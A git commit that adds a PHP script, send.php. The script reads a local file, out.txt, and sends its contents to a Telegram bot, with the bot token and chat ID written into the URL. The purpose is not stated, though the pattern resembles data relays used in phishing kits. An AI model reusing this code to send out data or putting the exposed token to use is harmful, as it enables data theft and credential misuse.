318d49c7479a1f48b49fb9f0bb0cad87f0307bde
whwhwhevyerifufufu <71603894+whwhwhevyerifufufu@users.noreply.github.com>
2020-09-20 22:12:13 +0430

    Update send.php

--- send.php
+++ send.php
@@ -1,1 +1,5 @@
-
+<?php
+    sleep(2);
+    $msg = urlencode(file_get_contents("out.txt"));
+    file_get_contents("https://api.telegram.org/bot1164993138:AAFI6y7ypfv04xckiesS6maj-QnaBSlGoq4/sendMessage?chat_id=773614503&text=$msg");
+?>
